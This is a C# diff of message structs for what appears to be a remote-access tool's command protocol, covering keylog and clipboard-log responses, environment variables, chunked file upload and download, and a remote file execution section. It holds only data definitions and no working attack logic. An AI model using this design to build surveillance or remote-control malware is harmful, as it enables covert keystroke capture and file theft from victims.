@@ -44,8 +44,8 @@ public static class OpStructs
 	[Serializable]
 	public struct KeyLogResponse
 	{
-		public int LogIndex;
-		public byte[] CompressedLog;
+		public int LogIndex { get; set; }
+		public byte[] CompressedLog { get; set; }
 	}
 	#endregion
 
@@ -62,11 +62,10 @@ public static class OpStructs
 		public bool Enabled;
 	}
 
-	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+	[Serializable]
 	public struct ClipboardLogResponse
 	{
-		public long TotalKeyStrokes;
-		public byte[] CompressedKeyLog;
+		public byte[] CompressedKeyLogs;
 	}
 	#endregion
 
@@ -85,11 +84,55 @@ public static class OpStructs
 	[Serializable]
 	public struct EnvVarsResponse
 	{
-		public List<(string, string)> Map;
+		public List<(string, string)> Map { get; set; }
 	}
 	#endregion
 
 	#region FileIO
+	[Serializable]
+	public struct UploadFileRequest
+	{
+		public Guid Ident { get; set; }
+		public string Destination { get; set; }
+		public long TotalChunkCount { get; set; }
+	}
+
+	[Serializable]
+	public struct UploadFileChunkResponse
+	{
+		public Guid Ident { get; set; }
+		public long ChunkIndex { get; set; }
+		public byte[] Data { get; set; }
+	}
+
+	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+	public struct UploadFileResponse
+	{
+		public Guid Ident { get; set; }
+		public long TotalChunkCount;
+	}
+
+	[Serializable]
+	public struct DownloadFileRequest
+	{
+		public Guid Ident { get; set; }
+		public string Source { get; set; }
+	}
+
+	[Serializable]
+	public struct DownloadFileChunkResponse
+	{
+		public Guid Ident { get; set; }
+		public long ChunkIndex { get; set; }
+		public byte[] Data { get; set; }
+	}
+
+	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+	public struct DownloadFileResponse
+	{
+		public Guid Ident { get; set; }
+		public long TotalChunkCount;
+	}
 	#endregion
 
 	#region Remote File Execution
